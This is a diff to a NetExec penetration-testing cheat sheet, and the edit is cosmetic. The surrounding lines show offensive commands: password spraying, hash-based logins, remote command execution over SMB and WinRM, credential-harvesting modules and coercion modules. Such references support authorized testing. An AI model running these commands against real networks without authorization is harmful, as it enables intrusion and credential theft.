@@ -1,6 +1,7 @@
 **Overview:**
+**NetExec (NXC)** is an **open-source** network service exploitation tool used to automate the assessment of large networks. It is commonly used in Windows and Active Directory penetration tests for credential validation, SMB and LDAP enumeration, command execution, password spraying, share discovery, and post-exploitation workflows.
 
-
+---
 ### Core Syntax
 
 #### Basic Command Structure
@@ -18,7 +19,7 @@ nxc smb 192.168.1.10-20                 # Range
 nxc smb targets.txt                     # File input
 ```
 
-***
+---
 
 ### Authentication Methods
 
@@ -64,7 +65,7 @@ nxc smb <target> -u users.txt -p passwords.txt
 nxc smb <target> -u users.txt -H hashes.txt
 ```
 
-***
+---
 
 ### SMB Protocol Operations
 
@@ -139,7 +140,7 @@ nxc smb <target> -u username -p password -x "ipconfig /all"
 nxc smb <target> -u username -p password -X "Get-Process"
 ```
 
-***
+---
 
 ### LDAP Protocol Operations
 
@@ -218,7 +219,7 @@ nxc ldap <target> -u username -p password -M maq
 nxc ldap <target> -u username -p password -M pre2k
 ```
 
-***
+---
 
 ### MSSQL Protocol Operations
 
@@ -256,7 +257,7 @@ nxc mssql <target> -u username -p password -q "SELECT @@VERSION"
 nxc mssql <target> -u username -p password --query "SELECT name FROM sys.databases"
 ```
 
-***
+---
 
 ### FTP Protocol Operations
 
@@ -274,7 +275,7 @@ nxc ftp <target> -u username -p password \
   --ls /path/to/directory --get filename.txt
 ```
 
-***
+---
 
 ### SSH Protocol Operations
 
@@ -291,7 +292,7 @@ nxc ssh <target> -u username --key-file id_rsa
 nxc ssh <target> -u username -p password -x "uname -a"
 ```
 
-***
+---
 
 ### WinRM Protocol Operations
 
@@ -303,7 +304,7 @@ nxc winrm <target> -u username -p password -x "whoami"
 nxc winrm <target> -u username -p password -X "Get-Process"
 ```
 
-***
+---
 
 ### Credential Harvesting
 
@@ -372,7 +373,7 @@ nxc smb <target> -u username -p password -M gpp_autologin
 nxc smb <target> -u username -p password -M msol
 ```
 
-***
+---
 
 ### Password Spraying
 
@@ -400,7 +401,7 @@ nxc ssh <target> -u users.txt -p passwords.txt --continue-on-success
 nxc ldap <target> -u users.txt -p passwords.txt --continue-on-success
 ```
 
-***
+---
 
 ### Vulnerability Scanning
 
@@ -436,7 +437,7 @@ nxc smb <target> -u username -p password -M dfscoerce
 nxc smb <target> -u username -p password -M printerbug
 ```
 
-***
+---
 
 ### Advanced Modules
 
@@ -504,4 +505,3 @@ nxc smb <target> -u username -p password -M wmi_exec \
   -o COMMAND="whoami"
 ```
 
-***
